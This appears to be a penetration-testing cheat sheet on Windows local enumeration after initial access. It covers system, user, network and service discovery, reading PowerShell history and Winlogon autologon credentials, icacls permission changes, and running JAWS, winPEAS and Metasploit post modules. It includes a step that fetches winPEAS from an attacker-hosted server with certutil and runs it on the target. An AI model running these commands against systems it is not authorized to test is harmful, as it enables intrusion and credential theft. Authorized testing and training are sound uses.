# Windows - Local Enumeration

### Manual Windows Local enumeration

### System Information

```bash
# Shell
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic product get name,version,vendor # all software with version in the machine

# Meterpreter
getuid
sysinfo
cd C:\Windows\System32\ && cat eula.txt # The file may not be exist
```

### Users & Groups

{% code title="Cmd" %}
```bash
whoami
whoami /all
whoami /priv
query user
net users
net user SYS_USER # (ex Administrator, guest, antonio)
net localgroup
net localgroup GROUP_NAME # view users in the group
net localgroup administrators # view user in administrators's group
```
{% endcode %}

{% code title="Meterpreter" %}
```bash
getuid
getprivs
```
{% endcode %}

{% code title="msfconsole" %}
```bash
use post/windows/gather/enum_logged_on_users
set sessions N
run
```
{% endcode %}

### Network information

{% code title="Cmd" %}
```bash
ipconfig
ipconfig /all
route print
arp -a
netstat -ano

netsh firewall show state
netsh advfirewall firewall help
netsh advfirewall show allprofiles
```
{% endcode %}

### Processes & Services

{% code title="Meterpreter session" %}
```bash

ps
pgrep SERVICE_NAME # pgrep explorer.exe
migrate PID

# Services
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST /v
```
{% endcode %}

### Console History

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```



### Auto Logon credentials

{% code title="Cmd" %}
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```
{% endcode %}



### Juicy Directory

```bash
cd C:\ # look for some custom directory
cd C:\Users\*\Documents
cd C:\Users\*\Desktop
cd C:\Users\*\Download
```



### Windows Permission

To check the permission for file/directory follow this commands:

```powershell
# see permission
icacls DIRECTORY/FILE

# change the permission
icacls "path" /grant UserOrGroup:PERMS
```



<details>

<summary>Windows Permission Legenda</summary>



| Permission Name          | Applies To       | icacls Code | Description                                                           |
| ------------------------ | ---------------- | ----------- | --------------------------------------------------------------------- |
| **Full Control**         | File / Directory | **F**       | Grants all permissions including changing ownership and permissions.  |
| **Modify**               | File / Directory | **M**       | Read, write, execute, delete. Cannot change permissions or ownership. |
| **Read & Execute**       | File / Directory | **RX**      | View and execute files; traverse folders.                             |
| **List Folder Contents** | Directory        | **(RX)**    | Same as Read & Execute, shown as RX in parentheses for folders.       |
| **Read**                 | File / Directory | **R**       | View data and attributes.                                             |
| **Write**                | File / Directory | **W**       | Write data, create files/folders.                                     |





| `(OI)` | Object Inherit — applies to files                  |
| ------ | -------------------------------------------------- |
| `(CI)` | Container Inherit — applies to folders             |
| `(IO)` | Inherit Only — permission applies to children only |
| `(N)`  | No Propagate Inherit                               |
| `(I)`  | Inherited permission                               |

</details>



## Automating Windows Local Enumeration

### JAWS

{% embed url="https://github.com/411Hall/JAWS" %}

1. Copy .ps1 script on attcker machine
2. upload on meterpreter session (in C:\Temp)
3. run this command on windows shell

```bash
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

```bash
# download file on attack machine
download JAWS-Enum.txt
```

### winPEAS

Download the last version on attacker machine

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

{% code overflow="wrap" %}
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/winPEASx64.exe
```
{% endcode %}

Transfer file to target machine

```bash
# attacker machine 
python3 -m http.server 80

# target machine
certutil -urlcache -f http://IP:80/winPEASx64.exe winPEASx64.exe
```

Execute WinPEAS on target machine

```powershell
.\winPEASx64.exe > peas.txt
```





***

### Metasploit

<pre class="language-bash"><code class="lang-bash"><strong># Metasploit
</strong>service postgresql start &#x26;&#x26; msfconsole

## Modules
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares

set session N
run
</code></pre>
